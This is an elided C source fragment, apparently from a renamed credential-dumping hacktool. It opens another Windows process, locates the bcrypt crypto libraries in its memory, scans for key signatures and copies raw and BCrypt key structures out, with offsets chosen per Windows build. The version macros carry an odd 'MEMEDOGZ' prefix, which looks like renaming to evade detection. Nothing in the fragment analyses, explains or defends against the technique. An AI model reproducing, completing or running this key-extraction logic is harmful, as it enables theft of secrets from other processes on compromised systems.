					...
					if(address->address = ULongToPtr(kUnk.KiwiRawKey))
					{
						...
						if(kull_m_memory_copy(&aLocalBuffer, address, sizeof(KIWI_RAWKEY32)))
						{
							if(kRaw.Algid && (kRaw.Algid <= 0xffff) && kRaw.dwData <= 0x8000)
							{
								...
								if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_2K3) // damn XP...
								{
							...
							{
								if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7)
									i = 308;
								else if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
									i = 300;
								else 
									i = 356;
				...
				if(p = (PKIWI_BCRYPT_GENERIC_KEY_HEADER) LocalAlloc(LPTR, Header.size))
				{
					...
					if(kull_m_memory_copy(&aLocalBuffer, address, Header.size))
					{
						...
						case BCRYPT_CIPHER_INTERFACE:
							...
							if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
							{
							...
							else if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
							{
						...
						case BCRYPT_ASYMMETRIC_ENCRYPTION_INTERFACE:
							...
							{
							case 'MSRK':
								if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
								{
								...
								else if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_10_1703)
								{
			...
			if(kull_m_memory_copy(&aLocalBuffer, &aRemote, pMemoryBasicInformation->RegionSize))
			{
				for(cur = (PBYTE) aLocalBuffer.address; cur < limite; cur += (ps->Machine == IMAGE_FILE_MACHINE_AMD64) ? sizeof(DWORD64) : sizeof(DWORD32))
				{
					if(
						...
						((MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt64_old : Bcrypt64)
						:
						((MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32)
						, size)
						#elif defined(_M_IX86)
						RtlEqualMemory(cur, (MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_7) ? Bcrypt32_old : Bcrypt32, size) 
						#endif
					)
					{
						if(ps->currPid != ps->prevPid)
			...
			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aRemote.hMemory))
			{
				...
				if(kull_m_process_peb(aRemote.hMemory, &Peb, FALSE))
				{
					...
					if(kull_m_process_ntheaders(&aRemote, &pNtHeaders))
					{
						...
						if(MEMEDOGZ_NT_MAJOR_VERSION > 5)
						{
							if(kull_m_process_getVeryBasicModuleInformationsForName(aRemote.hMemory, (MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"bcrypt.dll" : L"bcryptprimitives.dll", &cryptInfos))
							{
								ps->Machine = pNtHeaders->FileHeader.Machine;
								ps->bAllProcessKiwiCryptKey = FALSE;
								ps->currPid = pid;
